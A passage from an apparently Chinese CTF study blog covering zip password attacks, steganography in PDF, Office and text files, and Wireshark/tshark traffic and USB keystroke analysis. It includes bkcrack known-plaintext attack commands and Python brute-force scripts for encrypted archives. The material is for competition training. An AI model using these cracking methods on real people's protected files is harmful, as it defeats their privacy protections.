<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ bkcrack -C flag.zip -c <span class="string">&#x27;hint.jpg&#x27;</span> -p hint.jpg</span><br><span class="line">bkcrack 1.5.0 - 2023-03-08</span><br><span class="line">Data error: ciphertext is smaller than plaintext.</span><br></pre></td></tr></table></figure>
<p>用 -P 参数带上压缩包后即可正确解密出密钥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ bkcrack -C flag.zip -c hint.jpg -p hint.jpg -P hint.zip</span><br><span class="line">bkcrack 1.5.0 - 2023-03-08</span><br><span class="line">[14:37:27] Z reduction using 25761 bytes of known plaintext</span><br><span class="line">100.0 % (25761 / 25761)</span><br><span class="line">[14:37:29] Attack on 289 Z values at index 21821</span><br><span class="line">Keys: afb9fee3 f8795353 f6de1d4e</span><br><span class="line">100.0 % (289 / 289)</span><br><span class="line">[14:37:29] Keys</span><br><span class="line">afb9fee3 f8795353 f6de1d4e</span><br></pre></td></tr></table></figure>
<p>因此这种情况一定要记得将已有的文件用适当的压缩方法压缩成压缩包，然后用-P参数带上这个压缩包</p>
</li>
</ul>
<p>例题1 - 2023 铁三决赛-baby_jpg</p>
<p>我们先从部分伪加密的压缩包中分离出了 serect.pdf，然后从PDF中 foremost 出了加密压缩包中的 sha512.txt</p>
<p>将 sha512.txt 压缩成 sha512.zip，然后使用下面的命令进行明文攻击即可：</p>
<p>其中 -C 后是要破解的压缩包，-c 后是压缩包中我们要破解的文件，-P 后是我们压缩好的压缩包，-p 后是我们已得的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ bkcrack -C 00000218.zip -c <span class="string">&#x27;sha512.txt&#x27;</span> -P sha512.zip -p sha512.txt</span><br><span class="line">bkcrack 1.5.0 - 2023-03-08</span><br><span class="line">[16:14:25] Z reduction using 78 bytes of known plaintext</span><br><span class="line">100.0 % (78 / 78)</span><br><span class="line">[16:14:25] Attack on 104916 Z values at index 6</span><br><span class="line">Keys: ed3fb6a9 1c4a7211 c07461ed</span><br><span class="line">59.9 % (62867 / 104916)</span><br><span class="line">[16:14:52] Keys</span><br><span class="line">ed3fb6a9 1c4a7211 c07461ed</span><br></pre></td></tr></table></figure>
<p>破解出密钥后，用 -U 参数修改压缩包密码并导出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ bkcrack -C 00000218.zip -k ed3fb6a9 1c4a7211 c07461ed -U out.zip 111</span><br><span class="line">bkcrack 1.5.0 - 2023-03-08</span><br><span class="line">[16:15:44] Writing unlocked archive out.zip with password <span class="string">&quot;111&quot;</span></span><br><span class="line">100.0 % (3 / 3)</span><br><span class="line">Wrote unlocked archive.</span><br></pre></td></tr></table></figure>
<h5 id="在比赛中的使用记录">在比赛中的使用记录</h5>
<p><strong>2022 西湖论剑zipeasy</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C zipeasy.zip -c dasflow.zip -x 30 646173666c6f772e706361706e67 -x 0 504B0304 &gt; 1.log &amp;</span><br></pre></td></tr></table></figure>
<p><strong>2023 DASCTFxCBCTF</strong></p>
<p>利用bkcrack反向爆破密钥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -k e48d3828 5b7223cc 71851fb0 -r 3 \?b</span><br><span class="line"><span class="comment">#bkcrack 1.5.0 - 2023-03-08</span></span><br><span class="line"><span class="comment">#[17:47:50] Recovering password</span></span><br><span class="line"><span class="comment">#length 0-6...</span></span><br><span class="line"><span class="comment">#[17:47:50] Password</span></span><br><span class="line"><span class="comment">#as bytes: 8b e7 dc</span></span><br><span class="line"><span class="comment">#as text: ���</span></span><br></pre></td></tr></table></figure>
<p>然后如果要对得到的密钥进行MD5加密，可以使用CyberChef（From Hex + MD5）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/MD5.png"
                        alt="MD5"
                 ></p>
<p>Tips：题目做不出来可以尝试多换几个压缩软件：Bandzip、Winrar、7zip、360压缩、2345压缩等</p>
<h4 id="暴力破解-爆破时注意限制长度">暴力破解(爆破时注意限制长度)</h4>
<p>可以使用 Advanced Archive Password Recovery 进行爆破</p>
<p>(1)  如果知道部分的密码，可以使用掩码攻击，例如：???LiHua</p>
<p>(2) 没啥思路的时候可以直接用纯数字密码爆破看看，也可以用字典爆破</p>
<p>(3) 如果爆破的速度很慢，可以用 Passware Kit Forensic 2021 v1 (64-bit) 来爆破（也可以自定义字典）</p>
<h4 id="连环套压缩包">连环套压缩包</h4>
<p>可以用fcrackzip进行爆破或者使用CTFD中的脚本爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_name = <span class="string">&#x27;pic/&#x27;</span> + <span class="string">&#x27;f932f55b83fa493ab024390071020088.zip&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">     zf = zipfile.ZipFile(file_name)</span><br><span class="line">     re_result = re.search(<span class="string">&#x27;[0-9]*&#x27;</span>, zf.namelist()[<span class="number">0</span>])</span><br><span class="line">     passwd = re_result.group()</span><br><span class="line">     zf.extractall(path=<span class="string">&#x27;pic/&#x27;</span>, pwd=re_result.group().encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">     file_name = <span class="string">&#x27;pic/&#x27;</span> + zf.namelist()[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;get the result&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="未知后缀的压缩包">未知后缀的压缩包</h4>
<p>可以多用几个压缩软件试试，比如Winrar 7z</p>
<h4 id="分卷压缩包合并">分卷压缩包合并</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /B topic.zip.001 + topic.zip.002+topic.zip.003+topic.zip.004+topic.zip.005+topic.zip.006 topic.zip</span><br></pre></td></tr></table></figure>
<h4 id="压缩包炸弹">压缩包炸弹</h4>
<p>很小的压缩文件，解压出来会占据巨大的空间，甚至撑爆磁盘<br>
处理方法：010中直接编辑压缩包文件，看看是否藏有另一个压缩包</p>
<h4 id="根据010中的模板修改了某些参数">根据010中的模板修改了某些参数</h4>
<p>有些题目可能会修改源数据中压缩包文件中被压缩文件的文件名的长度</p>
<p>源数据中被压缩文件名字的长度对不上也会导致解压后文件无法打开</p>
<p>所以…010的模板功能真的非常非常的好用！</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/010.png"
                        alt="010"
                 ></p>
<h4 id="压缩包密码是不可见字符">压缩包密码是不可见字符</h4>
<h5 id="字节数很短的情况">字节数很短的情况</h5>
<p>直接写个Python脚本爆破即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 在ASCII编码中，一个字符占用8位（1字节）</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            fz = zipfile.ZipFile(<span class="string">&#x27;secret key.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            password = libnum.n2s(i) + libnum.n2s(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+]正在尝试密码<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                fz.extractall(pwd=password)</span><br><span class="line">                fz.close()</span><br><span class="line">                <span class="keyword">return</span> password</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                fz.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    password = solve()</span><br><span class="line">    <span class="keyword">if</span> password:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]压缩包解压成功,密码是<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]在该范围内找不到压缩包密码，压缩包解压失败&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="字节数较长的情况">字节数较长的情况</h5>
<p>需要先把密码base64编码一下，然后再base64解码成byte类型作为密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pyzipper</span><br><span class="line"></span><br><span class="line">target_zip = <span class="string">&#x27;1.zip&#x27;</span></span><br><span class="line">outfile = <span class="string">&#x27;./solved&#x27;</span></span><br><span class="line"></span><br><span class="line">pwd = base64.b64decode(<span class="string">b&#x27;aEXigItjVOKAjEbigI8=&#x27;</span>)</span><br><span class="line"><span class="comment"># b&#x27;hE\xe2\x80\x8bcT\xe2\x80\x8cF\xe2\x80\x8f&#x27;</span></span><br><span class="line"><span class="keyword">with</span> pyzipper.AESZipFile(target_zip, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.pwd = pwd</span><br><span class="line">    f.extractall(outfile)</span><br></pre></td></tr></table></figure>
<h3 id="PDF隐写">PDF隐写</h3>
<ul>
<li>
<p>直接binwalk或者foremost解出隐藏文件</p>
</li>
<li>
<p>可能是wbStego4open隐写，用wbStego4open直接decode</p>
</li>
<li>
<p>PDF中可能携带了什么文件，可以在Firefox或者别的PDF软件中打开并提取</p>
</li>
<li>
<p>PDF中可能有透明的文字，直接全选复制然后粘贴到记事本中查看即可</p>
</li>
<li>
<p>DeEgger Embedder隐写，可以直接使用 DeEgger Embedder 工具 extract files</p>
</li>
<li>
<p>部分PDF可以用Photoshop打开，关键信息可能隐藏在下面的图层里，例如 <code>2024 古剑山 - jpg</code>，尤其是Adobe Acrobat Pro出现提示：<code>无法选择文本，这是扫描的PDF，因此您无法选择和复制文本，要运行文本识别 (OCR) 以选择文本吗？</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/a3c64e6d7b4e8aefe27090a267ada3ee.png"
                        alt="a3c64e6d7b4e8aefe27090a267ada3ee"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/be05755260bd2de077f8c3059b262190.png"
                        alt="be05755260bd2de077f8c3059b262190"
                 ></p>
</li>
</ul>
<h3 id="MS-Office隐写">MS-Office隐写</h3>
<h4 id="Excel文件：-xls-xlsx">Excel文件：.xls .xlsx</h4>
<ul>
<li>
<p>拉入010或者记事本，查找flag</p>
</li>
<li>
<p>取消隐藏先前隐藏的行和列</p>
</li>
<li>
<p>条件格式里设置突出显示某些单元格(黑白后可能会有图案)</p>
</li>
<li>
<p>要先将数据按照行列排序后再进行处理</p>
</li>
</ul>
<h4 id="Word文件：-doc-docx">Word文件：.doc .docx</h4>
<ul>
<li>
<p>直接foremost出隐藏文件</p>
</li>
<li>
<p>与宏有关系的各种攻击与隐写</p>
<ul>
<li>
<p>分析word中的宏需要用到这样一个工具：oletools</p>
<p>这个工具直接在pip中安装即可使用: pip3 install oletools</p>
<p>doc格式可以不需要文档密码直接提取其中的vba宏代码</p>
<p>安装好oletools后直接运行以下代码提取即可，可能加密文档的加密算法就在期中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba attachment.doc &gt; test.txt</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>利用行距来隐写（例：ISCC2023-汤姆历险记）</p>
<p>word中可能有一段是1倍行距，可能又有一段是1.5倍行距，需要根据不同行距敲出摩斯电码（单倍转为.多倍转为-空行转为空格或者分隔符）</p>
</li>
</ul>
<h3 id="TXT文本隐写">TXT文本隐写</h3>
<ul>
<li>
<p><strong>NTFS流隐写</strong></p>
<p>直接用NtfsStreamsEditor2扫描所在文件夹，然后导出文件</p>
<p>注意有关NTFS数据流的压缩包要使用WinRAR解压，否则可能遇到扫不出来的情况</p>
</li>
<li>
<p><strong>wbStego4open隐写</strong></p>
<p>用wbStego4open直接decode(可能有密钥)</p>
</li>
<li>
<p><strong>无字天书(whitespace)&amp;snow隐写</strong></p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/" >https://vii5ard.github.io/whitespace/<i class="fas fa-external-link-alt"></i></a><br>
snowdos32工具目录下运行 <code>SNOW.EXE -C -p password flag.txt</code> 命令即可</p>
</li>
<li>
<p><strong>垃圾邮件隐写(spammimic)</strong></p>
<p>在线网站：<a class="link"   target="_blank" rel="noopener" href="https://www.spammimic.com/" >https://www.spammimic.com/<i class="fas fa-external-link-alt"></i></a></p>
</li>
</ul>
<h3 id="HTML隐写">HTML隐写</h3>
<ul>
<li>wbStego4open隐写</li>
</ul>
<h3 id="流量分析">流量分析</h3>
<p>拿到流量包后，第一件事就是可以先 strings | grep flag{ 一下，说不定 flag 就直接出了</p>
<p>当然也可以使用凤二西师傅的 破空_flag查找工具3.5.exe 来搜索 flag</p>
<h4 id="WireShark基础">WireShark基础</h4>
<p>刚刚接触流量分析的同学可能会不太清楚 wireshark 的过滤器如何使用</p>
<p>但是用熟悉了其实很简单</p>
<p>常见的协议比如 http ，常用的有下面这些参数，其实只要在过滤器中输入 http. 它就会自动提示你了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br><span class="line">http.request.full_uri == “XXX”</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>还有一些比较常用的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 包含什么内容的帧</span></span><br><span class="line">frame contains <span class="string">&quot;XXX&quot;</span></span><br></pre></td></tr></table></figure>
<p>其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中）</p>
<p>有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/N1.png"
                        alt=""
                 ></p>
<h4 id="tshark使用教程">tshark使用教程</h4>
<p>导出流量包中所有POST数据包的data数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 1.pcapng -Y <span class="string">&quot;http.request.method == POST&quot;</span> -T fields -e data.data &gt; data.txt</span><br><span class="line"><span class="comment"># -r [输入的pcap文件路径]: 指定要分析的pcap文件。</span></span><br><span class="line"><span class="comment"># -Y &quot;http.request.method == POST&quot;: 使用一个显示过滤器只显示POST请求。</span></span><br><span class="line"><span class="comment"># -T fields: 输出指定的字段数据。</span></span><br><span class="line"><span class="comment"># -e http.file_data: 输出HTTP负载的数据。</span></span><br></pre></td></tr></table></figure>
<p>导出HTTP数据包中所有的数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 1.pcapng -Y <span class="string">&quot;http&quot;</span> -T fields -e http.file_data &gt; data.txt</span><br></pre></td></tr></table></figure>
<p>可以使用 uniq 参数去除重复行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 1.pcapng -Y <span class="string">&quot;dns&quot;</span> -T fields -e dns.qry.name | <span class="built_in">uniq</span>  &gt; data.txt</span><br></pre></td></tr></table></figure>
<h4 id="流量分析基础考点">流量分析基础考点</h4>
<ul>
<li>wireshark提取数据流:</li>
</ul>
<p>​	可以用tcpxtract工具：tcpxtract -f 1.pcap</p>
<p>​	strings webshell.pcapng | grep {</p>
<p>​	//打印出文件中所有可打印字符</p>
<ul>
<li>
<p>协议分级+导出HTTP对象</p>
</li>
<li>
<p>流量包端口隐写（可能会有01互换）</p>
</li>
<li>
<p>TCP/FTP协议传输文件(binwalk和foremost都没用)：</p>
<ul>
<li>直接用wireshark导出为pcap文件然后用networkminer分析</li>
<li>拉入kali用tcpxtract提取文件：tcpxtract -f +文件名.pcap</li>
<li>直接追踪流提取16进制，根据文件头尾提取出文</li>
</ul>
</li>
<li>
<p>有时候可能需要分版本分别导出</p>
</li>
<li>
<p>可能可以直接搜索flag明文或者编码加密过的flag</p>
</li>
</ul>
<p>搜索flag脚本，待改进。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Python2 的脚本</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印可打印字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_re</span>(<span class="params">str1</span>):</span><br><span class="line">    str2=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1.decode(<span class="string">&#x27;utf8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print(ord(i))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">126</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">33</span>:</span><br><span class="line">                str2 += i</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">                str2 += <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">#print(str2)</span></span><br><span class="line">    <span class="keyword">return</span> str2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#写入文本函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">txt_wt</span>(<span class="params">name,txt1</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;filename:&#x27;</span>+name)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;flag:&#x27;</span>+txt1)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次运行，清空output文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_txt</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;clear output.txt！！！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归遍历的所有文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_bianli</span>():</span><br><span class="line">    <span class="comment"># 路径设置为当前目录</span></span><br><span class="line">    path = os.getcwd()</span><br><span class="line">    <span class="comment"># 返回文件下的所有文件列表</span></span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> i, j, k <span class="keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="keyword">for</span> dd <span class="keyword">in</span> k:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;.py&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd  <span class="keyword">and</span> <span class="string">&quot;output.txt&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dd:</span><br><span class="line">                file_list.append(os.path.join(i, dd))</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line"><span class="comment">#查找文件中可能为flag的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">file_list,flag</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(i,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> f.readlines():</span><br><span class="line">                    j1=str_re(j)<span class="comment">#可打印字符串</span></span><br><span class="line">                    <span class="comment">#print j1</span></span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> flag:</span><br><span class="line">                        <span class="keyword">if</span> k <span class="keyword">in</span> j1:</span><br><span class="line">                            txt_wt(i, j1)</span><br><span class="line">                            <span class="built_in">print</span> <span class="string">&#x27;filename:&#x27;</span>,i</span><br><span class="line">                            <span class="built_in">print</span> <span class="string">&#x27;flag:&#x27;</span>,j1</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;err&#x27;</span></span><br><span class="line"></span><br><span class="line">flag_txt = [<span class="string">&#x27;flag&#123;&#x27;</span>, <span class="string">&#x27;666c6167&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;Zmxh&#x27;</span>,<span class="string">&#x27;&amp;#102&#x27;</span>, <span class="string">&#x27;666C6167&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#清空输出的文本文件</span></span><br><span class="line">clear_txt()</span><br><span class="line"><span class="comment">#遍历文件名</span></span><br><span class="line">file_lt=file_bianli()</span><br><span class="line"><span class="comment">#查找flag关键字</span></span><br><span class="line">flag(file_lt,flag_txt)</span><br></pre></td></tr></table></figure>
<h4 id="USB流量分析">USB流量分析</h4>
<p>4字节为鼠标流量，8字节为键盘流量。</p>
<p>数据部分在Leftover Capture Data域中</p>
<p>**一些奇技淫巧：**Alt键+数字键分析，可以获得ASCII码</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016083425673.png"
                        alt="image-20241016083425673"
                 ></p>
<h5 id="键盘流量分析">键盘流量分析</h5>
<p>例题5：键盘流量分析</p>
<p>先在wsl或者别的虚拟机中用tshark提取数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#提取数据的命令，这里用正则表达式剔除了空行</span></span><br><span class="line">tshark -r usb.pcapng -T fields -e usb.capdata | sed <span class="string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p>Tips：老版本的tshark提取数据是有冒号的，新版本就没有冒号了，所以需要我们自己添加冒号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#给键盘流量数据添加冒号.py</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">16</span>:  <span class="comment"># 鼠标流量的话len改为8</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i + <span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out += a[i] + a[i + <span class="number">1</span>] + <span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out += a[i] + a[i + <span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>
<p>加完冒号以后我们就可以直接用脚本翻译数据了</p>
